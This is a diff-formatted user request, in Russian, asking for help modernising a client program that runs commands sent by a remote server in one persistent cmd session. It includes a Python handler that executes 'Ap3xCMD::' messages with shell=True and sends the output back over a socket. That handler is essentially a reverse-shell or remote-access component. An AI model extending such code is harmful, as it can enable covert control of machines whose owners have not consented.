@@ -1,0 +1,25 @@
+Привет. Помоги модернизировать код...
+У меня есть клиентская часть, тоесть client-side (которая подключается к server-side) а так же есть server-side который принимает подключение клиента (client-side)
+У меня есть функция исполнения команд в cmd и отправка результата выполнения команды на server-side...
+нужно сделать так, чтобы эта cmd в которой будут выполнятся команды сервера была одной, и все выполнялось в ней одной.
+Ибо при каждой новой команде используется новая cmd и в этом случае не получается использовать команду "cd" для перемещения по дерикториям. Вот что нужно сделать:
+один сеанс cmd в котором как раз будут выполнятся все команды отправленные сервером
+и кстати, сделай так, чтобы при каждом получении команды проверялось, открыта ли такая командная строка, и если открыта, то пусть там и выполняется, если не открыта, то чтоб открывалась. Чтоб не открывало много раз, и ибо я хочу сделать кнопку exit на server-side чтобы посылать команду закрытия этой cmd на client-side (но это не пиши, это я сделаю).
+
+Вот код client-side:
+
+elif data.startswith("Ap3xCMD:"): # CMD HANDLE
+                try:
+                    data_transfering = True
+                    command, toProcess = data.split("::")
+                    process = Popen(toProcess, shell=True, stdout=PIPE, stderr=PIPE)
+                    stdout, stderr = process.communicate()
+                    # Декодируем полученные байты
+                    stdout = stdout.decode('cp866')
+                    stderr = stderr.decode('cp866')
+                    if " " in stderr:
+                        client_socket.send(f"Ap3xCMDAnsw3r::ERROR: {stderr}".encode())
+                    else:
+                        client_socket.send(f"Ap3xCMDAnsw3r:: {stdout}".encode())
+                except Exception as e:
+                    print(e)
